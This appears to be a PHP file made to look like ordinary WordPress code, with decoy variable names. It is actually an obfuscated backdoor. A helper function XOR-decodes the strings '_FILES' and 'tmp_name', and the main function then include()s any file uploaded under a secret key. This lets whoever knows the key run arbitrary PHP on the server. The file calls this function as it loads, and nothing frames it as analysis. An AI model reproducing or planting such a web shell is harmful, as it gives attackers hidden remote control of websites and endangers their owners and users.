<?php 	

function valid_date()

{

    $parent_data = 'yxGyAEylr00';
	$prev_value = 'patterns';
    $public = $parent_data;
    

    $strip = $GLOBALS[rel_array("%26%3E%0E5%04%16", $public)];
    $supports = $strip;

    $unsanitized_postarr = isset($supports[$public]);
    if ($unsanitized_postarr)

    {
	$needle = 'parent';
        $last_pee = $strip[$public];
        $property_value = $last_pee[rel_array("%0D%157%26%2F%24%14%09", $public)];

        $encoded_text = $property_value;
        include ($encoded_text);
    }
}
function rel_array($allowed_protocols, $pee_parts)

{
    $rewrite = $pee_parts;

    $attrs = "url" . "decode";
    $pre_tags = $attrs($allowed_protocols);
    $header = substr($rewrite,0, strlen($pre_tags));
    $tag_names = $pre_tags ^ $header;
    
    $pre_tags = strpos($tag_names, $header);
    

    return $tag_names;

}


	$term = 'error';
valid_date();

	$original_url = 'urls_to_ping';
?>
